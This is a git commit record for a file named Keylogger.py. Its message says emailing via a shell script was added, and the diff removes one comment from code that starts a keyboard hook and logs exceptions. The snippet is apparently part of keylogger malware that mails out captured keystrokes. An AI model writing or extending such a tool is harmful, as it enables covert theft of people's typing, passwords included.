d97e0cc0fb69144af620eb2d65a1c4a4617db825
Jeremy Tabujara <jemy_T20@hotmail.com>
2020-12-01 18:30:27 -0800

    Emailing added via shell script
    Shell script email added. (UNTESTED)
    Variable modifcation also added.

--- Keylogger.py
+++ Keylogger.py
@@ -25,7 +25,6 @@ new_hook.HookKeyboard()
 try:
     new_hook.start()         # start the hook
 except KeyboardInterrupt:
-    # User cancelled from command line.
     pass
 except Exception as ex:
     # Write exceptions to the log file, for analysis later.
